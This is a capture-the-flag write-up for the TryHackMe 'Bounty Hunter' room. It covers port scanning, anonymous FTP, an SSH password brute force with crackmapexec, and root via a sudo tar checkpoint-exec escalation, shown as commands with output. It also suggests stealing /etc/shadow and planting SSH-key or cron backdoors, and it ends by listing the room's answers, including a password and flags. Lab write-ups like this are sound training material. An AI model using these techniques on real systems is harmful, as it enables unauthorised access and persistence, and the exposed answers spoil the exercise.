# Write Up for Try Hack Me box - [Bounty Hunter](https://tryhackme.com/room/cowboyhacker)

Easy Box with a twist. The Web page is not the way in.\
Fall back on the more crude methods to pwn the Box.

> Pratyush Prakhar (5#1NC#4N) - 10/29/2023

## RECONNAISSANCE

1. Scan the box with rustscan.
	1. Full port scan --> [nmap file here](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Bounty%20Hunter/rustscan/all.nmap).

	**Results**

	```bash
	$ rustscan --range 1-65535 -a 10.10.59.237 -- -oN rustscan/all.nmap 
	.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
	| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
	| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
	`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
	The Modern Day Port Scanner.
	________________________________________
	: http://discord.skerritt.blog           :
	: https://github.com/RustScan/RustScan :
	--------------------------------------
	Nmap? More like slowmap.🐢

	[~] The config file is expected to be at "/home/kali/.rustscan.toml"
	[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
	[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
	Open 10.10.59.237:22
	Open 10.10.59.237:21
	Open 10.10.59.237:80
	[~] Starting Script(s)
	[>] Running script "nmap -vvv -p {{port}} {{ip}} -oN rustscan/all.nmap" on ip 10.10.59.237
	Depending on the complexity of the script, results may take some time to appear.
	[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 21:34 IST
	Initiating Ping Scan at 21:34
	Scanning 10.10.59.237 [2 ports]
	Completed Ping Scan at 21:34, 0.15s elapsed (1 total hosts)
	Initiating Parallel DNS resolution of 1 host. at 21:34
	Completed Parallel DNS resolution of 1 host. at 21:34, 0.10s elapsed
	DNS resolution of 1 IPs took 0.10s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
	Initiating Connect Scan at 21:34
	Scanning 10.10.59.237 [3 ports]
	Discovered open port 22/tcp on 10.10.59.237
	Discovered open port 21/tcp on 10.10.59.237
	Discovered open port 80/tcp on 10.10.59.237
	Completed Connect Scan at 21:34, 0.16s elapsed (3 total ports)
	Nmap scan report for 10.10.59.237
	Host is up, received syn-ack (0.16s latency).
	Scanned at 2023-11-04 21:34:25 IST for 0s

	PORT   STATE SERVICE REASON
	21/tcp open  ftp     syn-ack
	22/tcp open  ssh     syn-ack
	80/tcp open  http    syn-ack

	Read data files from: /usr/bin/../share/nmap
	Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
	```

	2. Full Service and Scripts scan on the found ports. --> [nmap file here](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Bounty%20Hunter/rustscan/main.nmap)

	**Results**

	```bash
	$ rustscan --ports 21,22,80 -a 10.10.59.237 -- -sC -sV -oN rustscan/main.nmap 
	.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
	| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
	| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
	`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
	The Modern Day Port Scanner.
	________________________________________
	: http://discord.skerritt.blog           :
	: https://github.com/RustScan/RustScan :
	--------------------------------------
	Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

	[~] The config file is expected to be at "/home/kali/.rustscan.toml"
	[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
	[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
	Open 10.10.59.237:22
	Open 10.10.59.237:21
	Open 10.10.59.237:80
	[~] Starting Script(s)
	[>] Running script "nmap -vvv -p {{port}} {{ip}} -sC -sV -oN rustscan/main.nmap" on ip 10.10.59.237
	Depending on the complexity of the script, results may take some time to appear.
	[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 21:35 IST
	NSE: Loaded 156 scripts for scanning.
	NSE: Script Pre-scanning.
	NSE: Starting runlevel 1 (of 3) scan.
	Initiating NSE at 21:35
	Completed NSE at 21:35, 0.00s elapsed
	NSE: Starting runlevel 2 (of 3) scan.
	Initiating NSE at 21:35
	Completed NSE at 21:35, 0.00s elapsed
	NSE: Starting runlevel 3 (of 3) scan.
	Initiating NSE at 21:35
	Completed NSE at 21:35, 0.00s elapsed
	Initiating Ping Scan at 21:35
	Scanning 10.10.59.237 [2 ports]
	Completed Ping Scan at 21:35, 0.20s elapsed (1 total hosts)
	Initiating Parallel DNS resolution of 1 host. at 21:35
	Completed Parallel DNS resolution of 1 host. at 21:35, 0.10s elapsed
	DNS resolution of 1 IPs took 0.10s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
	Initiating Connect Scan at 21:35
	Scanning 10.10.59.237 [3 ports]
	Discovered open port 22/tcp on 10.10.59.237
	Discovered open port 21/tcp on 10.10.59.237
	Discovered open port 80/tcp on 10.10.59.237
	Completed Connect Scan at 21:35, 0.20s elapsed (3 total ports)
	Initiating Service scan at 21:35
	Scanning 3 services on 10.10.59.237
	Completed Service scan at 21:36, 6.44s elapsed (3 services on 1 host)
	NSE: Script scanning 10.10.59.237.
	NSE: Starting runlevel 1 (of 3) scan.
	Initiating NSE at 21:36
	NSE: [ftp-bounce 10.10.59.237:21] PORT response: 500 Illegal PORT command.
	NSE Timing: About 99.76% done; ETC: 21:36 (0:00:00 remaining)
	Completed NSE at 21:36, 31.63s elapsed
	NSE: Starting runlevel 2 (of 3) scan.
	Initiating NSE at 21:36
	Completed NSE at 21:36, 1.28s elapsed
	NSE: Starting runlevel 3 (of 3) scan.
	Initiating NSE at 21:36
	Completed NSE at 21:36, 0.00s elapsed
	Nmap scan report for 10.10.59.237
	Host is up, received syn-ack (0.20s latency).
	Scanned at 2023-11-04 21:35:54 IST for 39s

	PORT   STATE SERVICE REASON  VERSION
	21/tcp open  ftp     syn-ack vsftpd 3.0.3
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	|_Can't get directory listing: TIMEOUT
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to ::ffff:10.17.88.193
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      At session startup, client count was 2
	|      vsFTPd 3.0.3 - secure, fast, stable
	|_End of status
	22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgcwCtWTBLYfcPeyDkCNmq6mXb/qZExzWud7PuaWL38rUCUpDu6kvqKMLQRHX4H3vmnPE/YMkQIvmz4KUX4H/aXdw0sX5n9jrennTzkKb/zvqWNlT6zvJBWDDwjv5g9d34cMkE9fUlnn2gbczsmaK6Zo337F40ez1iwU0B39e5XOqhC37vJuqfej6c/C4o5FcYgRqktS/kdcbcm7FJ+fHH9xmUkiGIpvcJu+E4ZMtMQm4bFMTJ58bexLszN0rUn17d2K4+lHsITPVnIxdn9hSc3UomDrWWg+hWknWDcGpzXrQjCajO395PlZ0SBNDdN+B14E0m6lRY9GlyCD9hvwwB
	|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMCu8L8U5da2RnlmmnGLtYtOy0Km3tMKLqm4dDG+CraYh7kgzgSVNdAjCOSfh3lIq9zdwajW+1q9kbbICVb07ZQ=
	|   256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqmJn+c7Fx6s0k8SCxAJAoJB7pS/RRtWjkaeDftreFw
	80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	|_http-title: Site doesn't have a title (text/html).
	| http-methods: 
	|_  Supported Methods: POST OPTIONS GET HEAD
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

	NSE: Script Post-scanning.
	NSE: Starting runlevel 1 (of 3) scan.
	Initiating NSE at 21:36
	Completed NSE at 21:36, 0.00s elapsed
	NSE: Starting runlevel 2 (of 3) scan.
	Initiating NSE at 21:36
	Completed NSE at 21:36, 0.00s elapsed
	NSE: Starting runlevel 3 (of 3) scan.
	Initiating NSE at 21:36
	Completed NSE at 21:36, 0.00s elapsed
	Read data files from: /usr/bin/../share/nmap
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 40.25 seconds
	```

2. There are **3 TCP** ports open. 
	1. *Port 21* - FTP - **vsftpd 3.0.3**
	2. *Port 22* - SSH - **OpenSSH 7.2p2** 
	3. *Port 80* - WEB - **Apache httpd 2.4.18**

3. Let's explore FTP and WEB part first. Then we can use SSH.


## FTP

1. We have VsFTP installed on the system. Will require a set of login credentials to get access through this path. 
2. But NMAP says `Anonymous Login` is possible. So, let's explore that.
3. We find two useful files in the directory listing.
	1. [task.txt](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Bounty%20Hunter/ftp/task.txt) --> Leaks out a username `lin` that owns the list.
	2. [locks.txt](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Bounty%20Hunter/ftp/locks.txt) --> Possible secrets list as name suggests.
4. Let's keep this knowledge for later and dig into Web.

**Results**

```bash
$ ftp anonymous@10.10.59.237
Connected to 10.10.59.237.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||65073|)
ftp: Can't connect to `10.10.59.237:65073': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |**************************************************************************************|   418      746.25 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (1.99 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |**************************************************************************************|    68        1.27 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.25 KiB/s)
ftp> cd ..
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> 
```

## WEB

1. Let's first check out the web server on port 80. 
	1. We get a default page with no links going out. - Default HTML page. **We collect some useful [usernames](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Bounty%20Hunter/users.txt) though from index page.**
	\
	![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Bounty%20Hunter/images/web.png)
	\
	2. We will go for the low hanging fruit - robots, page source and try to get some information. - Nothing. Strange.
	\
	![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Bounty%20Hunter/images/ps.png)
	\
	3. We can also run other enumerations on the side as `subdomain` and `nikto`. - Nada. Check [here](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Bounty%20Hunter/web).
	4. Look through a proxy to get more details on the request:response model setup. Nothing to go on.
	5. We can run sub domain check on this port using `feroxbuster`. This turned up [empty too](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Bounty%20Hunter/web/ferox.txt). Not even a login portal or CMS. Maybe this is a rabbit hole. Smart creator.

2. This is very odd. But with exhausting all other options and getting hints from the Box questions, I think we need to Bruteforce the SSH service. Let's look into it.


## INITIAL ACCESS - SSH

1. Using my fav Swiss Army Knife - `crackmapexec` here. You can alternatively use tools like *Hydra* or *wfuzz*.

```bash
$ crackmapexec ssh 10.10.59.237 -u ../users.txt -p ../ftp/locks.txt 
SSH         10.10.59.237    22     10.10.59.237     [*] SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
SSH         10.10.59.237    22     10.10.59.237     [-] lin:rEddrAGON Authentication failed.
SSH         10.10.59.237    22     10.10.59.237     [-] lin:ReDdr4g0nSynd!cat3 Authentication failed.
SSH         10.10.59.237    22     10.10.59.237     [-] lin:Dr@gOn$yn9icat3 Authentication failed.
SSH         10.10.59.237    22     10.10.59.237     [-] lin:R3DDr46ONSYndIC@Te Authentication failed.
SSH         10.10.59.237    22     10.10.59.237     [-] lin:ReddRA60N Authentication failed.
SSH         10.10.59.237    22     10.10.59.237     [-] lin:R3dDrag0nSynd1c4te Authentication failed.
SSH         10.10.59.237    22     10.10.59.237     [-] lin:dRa6oN5YNDiCATE Authentication failed.
SSH         10.10.59.237    22     10.10.59.237     [-] lin:ReDDR4g0n5ynDIc4te Authentication failed.
SSH         10.10.59.237    22     10.10.59.237     [-] lin:R3Dr4gOn2044 Authentication failed.
SSH         10.10.59.237    22     10.10.59.237     [+] lin:********************
```

2. We get a legit set of [creds](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Bounty%20Hunter/creds.txt). We can use them to get on the box. Let's get the `user.txt` flag. 

```bash
$ ssh lin@10.10.59.237
lin@10.10.59.237's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{*************************}
```

3. As we have the password for the user, let's go for the low hanging fruits like `sudo -l`. We see that the user can run `tar` binary as root.
So, let's go back to [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo) to escalate privileges. We will also do other enumerations to find other ways.

```bash
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

## PRIVESC

1. Using the above method, we escalate to root. Now the keys are ours and so is the kingdom. Let's get on with the loot.

```bash
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
root@bountyhacker:~/Desktop# whoami
root
root@bountyhacker:~/Desktop# cat /root/root.txt 
THM{*******************}
```

## EXTRA TREAT 

1. We can now obtain the [following files](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Bounty%20Hunter/ssh/etc) easily that can be used later.
	1. **/etc/passwd**
	2. **/etc/shadow**
	3. **/etc/hosts**
	4. **/etc/sudoers**
	5. **/etc/crontab**
	6. **/proc**

2. We can also add [our *ssh keys*](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Bounty%20Hunter/ssh/bh.pub) to `authorized_keys` to get a foothold on the box. You can use other methods like crons and process hijacking as well to plant a backdoor.

3. Find out more with the linpeas scans that can be obtained [here](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Bounty%20Hunter/ssh/tmp).


## BROWNIE POINTS

2. Find open ports on the machine - **21, 22, 80**
3. Who wrote the task list? - **lin**
4. What service can you bruteforce with the text file found? - **SSH**
5. What is the users password? - **RedDr4gonSynd1cat3**
6. User.txt - **THM{CR1M3_SyNd1C4T3}**
7. root.txt - **THM{80UN7Y_h4cK3r}**

**Stay Tuned On**\
[GitHub](https://github.com/pratty010/Boxes)\
[LinkedIn](https://www.linkedin.com/in/pratyush-prakhar/)